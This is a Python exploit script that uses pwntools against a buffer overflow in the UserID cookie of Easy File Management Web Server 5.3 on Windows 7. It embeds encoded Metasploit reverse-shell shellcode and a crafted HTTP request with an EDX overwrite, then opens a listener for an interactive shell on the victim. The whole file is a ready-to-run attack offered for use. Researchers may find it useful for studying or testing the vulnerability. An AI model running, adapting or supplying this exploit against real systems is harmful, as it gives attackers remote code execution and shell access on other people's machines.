#!/usr/bin/env python3
#
# Exploit for Easy File Management Web Server 5.3 on Win7 32
# Vulnerable software from: https://www.exploit-db.com/apps/a46371c665d7c85689b47534904bc3f1-efmsetup.exe
# * pwntools
# * metasploit reverse_tcp payload

# The exploit from https://www.exploit-db.com/exploits/33453 brute forces stack address.
# That's a nice method, but it's less reliable. My method works 100% all the time.


import sys
import pwn
from threading import Thread


# set target info
RHOST = '127.0.0.1'
RPORT = 80
LPORT = 4444


def generate_payload():
    NOP = pwn.asm("nop")  # noqa: F841
    payload = b""

    # msfvenom -f python -v shellcode -p windows/shell_reverse_tcp LHOST=192.168.0.151 LPORT=4444 EXITFUNC=thread -b "\x00" -e x86/alpha_mixed # noqa: E501
    shellcode = b""
    shellcode += b"\x89\xe1\xda\xd9\xd9\x71\xf4\x5d\x55\x59\x49\x49"
    shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
    shellcode += b"\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
    shellcode += b"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
    shellcode += b"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
    shellcode += b"\x69\x6c\x4d\x38\x6c\x42\x47\x70\x55\x50\x63\x30"
    shellcode += b"\x63\x50\x4b\x39\x4a\x45\x55\x61\x79\x50\x33\x54"
    shellcode += b"\x6c\x4b\x50\x50\x70\x30\x4c\x4b\x52\x72\x54\x4c"
    shellcode += b"\x4c\x4b\x72\x72\x44\x54\x6e\x6b\x43\x42\x67\x58"
    shellcode += b"\x54\x4f\x4d\x67\x73\x7a\x71\x36\x36\x51\x69\x6f"
    shellcode += b"\x6e\x4c\x45\x6c\x51\x71\x71\x6c\x65\x52\x44\x6c"
    shellcode += b"\x45\x70\x4b\x71\x6a\x6f\x44\x4d\x36\x61\x39\x57"
    shellcode += b"\x7a\x42\x6a\x52\x36\x32\x70\x57\x4e\x6b\x46\x32"
    shellcode += b"\x64\x50\x4c\x4b\x51\x5a\x55\x6c\x6e\x6b\x30\x4c"
    shellcode += b"\x54\x51\x61\x68\x39\x73\x61\x58\x46\x61\x6e\x31"
    shellcode += b"\x56\x31\x6e\x6b\x76\x39\x31\x30\x56\x61\x38\x53"
    shellcode += b"\x6e\x6b\x50\x49\x76\x78\x4a\x43\x36\x5a\x33\x79"
    shellcode += b"\x4e\x6b\x45\x64\x6c\x4b\x65\x51\x6b\x66\x64\x71"
    shellcode += b"\x59\x6f\x6c\x6c\x7a\x61\x5a\x6f\x56\x6d\x33\x31"
    shellcode += b"\x68\x47\x70\x38\x79\x70\x32\x55\x5a\x56\x43\x33"
    shellcode += b"\x43\x4d\x4b\x48\x37\x4b\x61\x6d\x66\x44\x43\x45"
    shellcode += b"\x59\x74\x73\x68\x4c\x4b\x66\x38\x37\x54\x46\x61"
    shellcode += b"\x4a\x73\x65\x36\x6c\x4b\x56\x6c\x70\x4b\x4c\x4b"
    shellcode += b"\x72\x78\x47\x6c\x75\x51\x59\x43\x4c\x4b\x63\x34"
    shellcode += b"\x4c\x4b\x37\x71\x7a\x70\x6d\x59\x43\x74\x47\x54"
    shellcode += b"\x76\x44\x51\x4b\x61\x4b\x73\x51\x73\x69\x63\x6a"
    shellcode += b"\x30\x51\x49\x6f\x4b\x50\x33\x6f\x73\x6f\x51\x4a"
    shellcode += b"\x4e\x6b\x35\x42\x38\x6b\x4c\x4d\x61\x4d\x30\x68"
    shellcode += b"\x74\x73\x56\x52\x77\x70\x63\x30\x71\x78\x42\x57"
    shellcode += b"\x70\x73\x65\x62\x51\x4f\x76\x34\x65\x38\x70\x4c"
    shellcode += b"\x34\x37\x46\x46\x54\x47\x6b\x4f\x5a\x75\x68\x38"
    shellcode += b"\x4c\x50\x37\x71\x55\x50\x35\x50\x77\x59\x6a\x64"
    shellcode += b"\x66\x34\x72\x70\x52\x48\x44\x69\x4b\x30\x30\x6b"
    shellcode += b"\x63\x30\x39\x6f\x59\x45\x52\x70\x32\x70\x46\x30"
    shellcode += b"\x36\x30\x37\x30\x72\x70\x33\x70\x66\x30\x61\x78"
    shellcode += b"\x39\x7a\x74\x4f\x39\x4f\x4b\x50\x4b\x4f\x6b\x65"
    shellcode += b"\x6d\x47\x42\x4a\x57\x75\x65\x38\x6b\x70\x6d\x78"
    shellcode += b"\x57\x70\x6f\x67\x63\x58\x54\x42\x75\x50\x74\x51"
    shellcode += b"\x31\x4c\x4e\x69\x59\x76\x30\x6a\x66\x70\x61\x46"
    shellcode += b"\x72\x77\x73\x58\x6a\x39\x39\x35\x53\x44\x70\x61"
    shellcode += b"\x79\x6f\x39\x45\x4f\x75\x69\x50\x43\x44\x46\x6c"
    shellcode += b"\x6b\x4f\x50\x4e\x47\x78\x73\x45\x58\x6c\x75\x38"
    shellcode += b"\x48\x70\x6d\x65\x4c\x62\x46\x36\x4b\x4f\x4e\x35"
    shellcode += b"\x71\x78\x31\x73\x50\x6d\x53\x54\x33\x30\x6d\x59"
    shellcode += b"\x6d\x33\x33\x67\x56\x37\x70\x57\x46\x51\x58\x76"
    shellcode += b"\x72\x4a\x47\x62\x66\x39\x51\x46\x6a\x42\x49\x6d"
    shellcode += b"\x43\x56\x49\x57\x33\x74\x57\x54\x35\x6c\x47\x71"
    shellcode += b"\x36\x61\x4c\x4d\x50\x44\x35\x74\x64\x50\x6a\x66"
    shellcode += b"\x53\x30\x37\x34\x76\x34\x56\x30\x61\x46\x61\x46"
    shellcode += b"\x36\x36\x47\x36\x61\x46\x30\x4e\x70\x56\x43\x66"
    shellcode += b"\x71\x43\x71\x46\x52\x48\x61\x69\x78\x4c\x45\x6f"
    shellcode += b"\x6e\x66\x6b\x4f\x69\x45\x4e\x69\x49\x70\x32\x6e"
    shellcode += b"\x52\x76\x63\x76\x69\x6f\x36\x50\x55\x38\x74\x48"
    shellcode += b"\x6f\x77\x47\x6d\x43\x50\x6b\x4f\x6e\x35\x4f\x4b"
    shellcode += b"\x6d\x30\x47\x6d\x67\x5a\x37\x7a\x63\x58\x6c\x66"
    shellcode += b"\x7a\x35\x4d\x6d\x6d\x4d\x49\x6f\x69\x45\x55\x6c"
    shellcode += b"\x67\x76\x51\x6c\x75\x5a\x4b\x30\x39\x6b\x4d\x30"
    shellcode += b"\x62\x55\x35\x55\x6f\x4b\x31\x57\x72\x33\x34\x32"
    shellcode += b"\x72\x4f\x33\x5a\x67\x70\x46\x33\x4b\x4f\x59\x45"
    shellcode += b"\x41\x41"

    payload += NOP * 58
    payload += pwn.asm("jmp $+50")  # trampoline over next bytes
    payload += NOP * (74 - len(payload))

    # EDX overwrite, substract 0x28 from address of useful gadget
    # The gadget are bytes that happen to point to harmless moves + bunch of pops,
    # resulting in RET to trampoline and then shellcode
    payload += pwn.p32(0x10018A3C - 0x28)

    payload += NOP * 100  # nop sled
    payload += shellcode

    request = b""
    request += b"GET /vfolder.ghp HTTP/1.1\r\n"
    request += b"Host: 192.168.0.101\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    request += b"Accept-Language: en-US,en;q=0.5\r\n"
    request += b"Accept-Encoding: gzip, deflate\r\n"
    request += b"Referer: http://192.168.0.101/login.htm\r\n"
    request += b"Content-Type: application/x-www-form-urlencoded\r\n"
    request += b"Content-Length: 60\r\n"
    request += b"Cookie: UserID=%%u0000%s\r\n"  # overflow trigger
    request += b"Connection: close\r\n"
    request += b"\r\n"

    return request % payload


def attack():
    r = pwn.remote(RHOST, RPORT, typ="tcp")
    r.send(generate_payload())


if __name__ == "__main__":
    if len(sys.argv) > 1:
        RHOST = sys.argv[1]

    thread = Thread(target=attack)
    thread.start()

    listener = pwn.listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()
